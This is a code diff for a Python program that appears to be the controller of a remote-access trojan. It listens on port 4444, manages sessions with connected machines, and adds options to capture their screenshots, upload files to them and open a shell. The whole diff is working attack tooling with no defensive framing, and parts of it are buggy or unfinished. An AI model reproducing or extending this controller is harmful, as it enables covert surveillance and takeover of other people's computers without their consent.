@@ -1,5 +1,6 @@
 import os, socket, time, threading, sys
 from queue import Queue
+import tqdm
 
 queue = Queue()
 threads = 2
@@ -9,7 +10,9 @@ addresses = []
 connections = []
 
 selected_connection = None
-host = "192.168.15.105"
+selected_connection_id = -1
+
+host = "192.168.15.108"
 port = 4444
 buffer_bytes = 1024
 
@@ -17,10 +20,21 @@ def decode_utf8(bytes):
     return bytes.decode("utf-8")
 def remove_quotes(string):
     return string.replace("\"", "")
-def send_command(data):
+def send_data(data):
     selected_connection.send(data)
 def receive_data(buffer):
-    selected_connection.recv(buffer)
+    return selected_connection.recv(buffer)
+def receive_all(buffer):
+    byte_data = b""
+
+    while True:
+        byte_part = receive_data(buffer)
+        if len(byte_part) == buffer:
+            return byte_part
+        byte_data += byte_part
+
+        if len(byte_data) == buffer:
+            return byte_data
 
 def create_socket():
     global s
@@ -68,24 +82,90 @@ def menu_help():
     print("-i id Interact with a session" )
     print("")
 
+def menu_command_options():
+    print("\n-m Send message")
+    print("-s Take a screenshot")
+    print("-u Send File")
+    print("-d Download File")
+    print("-c Gain access to shell")
+    print("-b Put the session in background")
+    print("-h See all commands")
+
 def select_connection(connection_id):
-    global conn, selected_connection
+    global conn, selected_connection, selected_connection_id
 
     try:
         connection_id = int(connection_id)
         conn = connections[connection_id]
         print("Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0], addresses[connection_id][1])
         selected_connection = conn
+        selected_connection_id = connection_id
     except:
         print("Invalid session!")
         return
 
-def interact():
+def send_file():
+    global selected_connection
     while True:
-        choice = input("\nChoose an option: ")
-        if (choice[:3] == "--m" and len(choice) > 3):
-            message = choice[4:]
-            send_command(message.encode())     
+        file_directory = input('Type the file directory >> ')
+        file_size = os.path.getsize(file_directory)
+
+        if file_size > 0:
+            break
+        else:
+            print("File not found!")
+    
+    splited_directory = file_directory.split("/")
+    file_name = splited_directory[len(splited_directory)-1]
+    send_data(f'upload-file {file_name}'.encode())
+
+    progress = tqdm.tqdm(range(file_size), f"Sending {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
+    
+    with open(file_directory, "rb") as f:
+        while True:
+            bytes_read = f.read(4096)
+            if not bytes_read:
+                break
+            send_data(bytes_read)
+            progress.update(len(bytes_read))
+        
+def receive_screenshot():
+    global selected_connection
+
+    selected_connection.send(str.encode("screenshot"))
+    print("Taking a screenshot...")
+    file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
+    picture = open(file_name, "wb")
+    
+    while True:
+        response = receive_data(4096)
+        try:
+            if decode_utf8(response) == 'done':
+                break
+        except:
+            picture.write(response)
+            
+
+    print("Receiving screenshot from now...")
+    picture.close()
+
+def interact():
+    global selected_connection, selected_connection_id
+
+    menu_command_options()
+    while True:
+        choice = input("\n>> ")
+        if (choice == '-h'):
+            menu_command_options()
+        elif choice == '-b':
+            print(f"Putting session {selected_connection_id} to sleep...")
+            selected_connection = None
+            selected_connection_id = -1
+            return
+        elif choice == '-s':
+            receive_screenshot()
+        elif choice == '-u':
+            send_file()
 
 def close():
     global connections, addresses
@@ -114,9 +194,9 @@ def list_connections():
         print("No connections.")
 
 def main_menu():
-    menu_help()
 
     while True:
+        menu_help()
         choice = input("\n>> ")
         if (choice == "-l"):
             list_connections()
@@ -131,7 +211,6 @@ def main_menu():
                 interact()
         else:
             print("Invalid choice!")
-            menu_help()
 
 def work():
     while True:
